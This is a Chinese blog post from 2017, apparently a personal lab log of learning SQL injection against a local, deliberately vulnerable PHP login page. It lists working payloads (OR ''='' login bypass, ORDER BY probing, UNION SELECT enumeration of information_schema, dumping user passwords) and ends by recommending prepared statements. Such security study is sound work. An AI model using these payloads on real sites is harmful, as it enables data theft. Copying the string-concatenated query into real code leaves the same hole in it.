---
layout: article
title: SQL injection 学习
date: 2017-05-22 02:37:43
categories: 安全
tags:
- 网络安全
- sql injection
---

# SQL injection

在国哥的安排下，对着 kali渗透测试之 SQL injeciton 视频教程一顿撸（虽然没什么卵用），记录下来自己的一些实验过程和经历。

## 提前准备

- 本地的 lemp 环境，搭建可参考：[Centos 7 Nginx + php + mysql Web服务器搭建](https://wanghaichi.github.io/2017/01/21/lempServer/) 和 [Unbuntu16.04 Nginx + php + mysql Web服务器搭建](https://wanghaichi.github.io/2017/03/10/lemp-Ubantu/) 当然 xampp 也是极好的。
- 用于攻击的 php 脚本和数据库，下面会给出

## 编写脚本

找个能够访问的地方，编写如下 php 脚本
```php
<html>
	<head></head>
	<body>
		<form action="./login.php" method="post">
			ID<input name="id" type="text"><br/>
			<input type="submit" value="提交">
		</form>
		<div>
		<p>
			<?php
				if($_POST['id']){
					$connection = new mysqli("localhost", "root", "hhxxttxs", "test");
					if($connection->connect_errno){
						 echo "Failed to connect to MySQL: (" . $connection->connect_errno . ") " . $connection->connect_error;
					}
					$id = $_POST['id'];
					// echo $name."<br/>".$password."<br/>";
					$sql = "SELECT name, password FROM `user` WHERE `id` = '". $id . "'";
					echo $sql."<br/>";
					$res = $connection->query($sql);
					// var_dump($res);
					while($row = $res->fetch_assoc() ){
						echo "姓名: ". $row['name'] . "<br/>";
						echo "密码: ". $row['password'] . "<br/>";
					}
				}
			?>
		</p>
		</div>
	</body>
</html>
```
在本地新建数据库 `test`，新建 user 表

![Picture](/images/2017-5-22-10-45.png)

## SQL injection 简介

### 原理

> 服务器端程序将用户输入参数作为参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器

对于一般处理数据库查询的语句，客户端会将用户输入的参数使用`''`包裹之后，形成 SQL 查询字符串，交给 SQL 服务去处理。对于没有进过数据处理的脚本，很容易产生 SQL 注入。

我们可以手动输入 ` ' " % ( ) `这些在 SQL 语法中有特殊含义的字符，进行 SQL 注入攻击。

### 用户登录判断
  - `SELECT * FROM users WHERE user='uname' AND password='pass'`
  - `SELECT * FROM users WHERE user='name' AND password='' OR ''=''`

通过以上语句可以跳过用户验证，因为第二个 SQL 语句恒为真。

### 手动漏洞挖掘--SQL注入

注意下面的所有事例中 + 表示空格，不加空格 `--` 起不了注释的作用。

#### 基于报错的检测方法

- `' " % ( )`

#### 基于布尔的检测

- `1' and '1'='1`   /   `1' and '1`
- `1' and '1'='1`   /   `1' and '0`

#### 表列数 / 显示信息位于哪一列

- `' order by 9--+`
- select * 时表字段数=查询字段数

可以通过这个方法判断当前表中有多少列，但需要脚本中的 SQL 语句使用 `*` 作为查询域

#### 联合查询

- `' union select 1,2--+`

![Picture](/images/2017-5-22-10-35.png)

- `' union all select database(),2--+` // 显示数据库名

![Picture](/images/2017-5-22-10-36.png)

- `' union all select user(), version()--+` // 显示用户，数据库版本

![Picture](/images/2017-5-22-11-02.png)

- `' union select database(), substring_index(USER(),"@",1)--`

![Picture](/images/2017-5-22-11-04.png);

#### 全局函数

- `@@datadir @@hostname @@VERSION @@version_compile_os--+`

![Picture](/images/2017-5-22-11-09.png)

![Picture](/images/2017-5-22-11-10.png)

![Picture](/images/2017-5-22-11-11.png)

#### 当前库

- `database()`

#### ASCII转字符

- `char()`

char 函数可以将 ascii 码转换成对应的字符。

#### 连接字符串

- `CONCAT_WS(CHAR(32,58,32),user(),database(),version())`

![Picture](/images/2017-5-22-11-14.png)

这里使用 CONCAT_WS 函数，将三个数据库信息拼接在一起，同时使用 ` : ` 进行分割。

#### 计算哈希

- `md5()`

可以使用目标服务器进行大规模的数据计算

#### Mysql 数据结构

- information_schema

#### 所有库所有表 / 统计库中表的数量

- `' union select table_name, table_schema from information_schema.tables--+`

![Picture](/images/2017-5-22-11-17.png)

- `' union select table_schema,count(*) FROM information_schema.tables group by table_schema --`

![Picture](/images/2017-5-22-11-23.png)

#### test库中的表名

- `' union select table_name, table_schema from information_schema.tables where table_schema='test'--+`

![Picture](/images/2017-5-22-11-26.png)

#### Users表中的所有列（user_id first_name last_name user password avatar）

- `' union select table_name, column_name from information_schema.columns where table_schema='test' and table_name='user'--+`

![Picture](/images/2017-5-22-11-27.png)

可以看到 user 表中的所有列名都被列出来了！

#### 查询 user password 列的内容

- `' union select name, password from test.user--+`

![Picture](/images/2017-5-22-11-29.png)

- `' union select null, concat(name, 0x3a, password) from user--+`

![Picture](/images/2017-5-22-11-30.png)

## 小结

可以看到一个简单的 SQL injection 漏洞，几乎可以攻击所有的数据库。更有甚者还可以直接攻击服务器（下回说）。因此在编写代码时一定要注意 SQL 语句的过滤。

目前看来，所有的过滤手段都是不可靠的，都有方法可以通过截断、欺骗等进行攻击。因此正确的操作应该是用 SQL 预编译，进行参数绑定，这样可以保证 SQL 的查询语句不被篡改。具体方法可以参见 [mysqli Prepared Statements](http://php.net/manual/zh/mysqli.quickstart.prepared-statements.php)
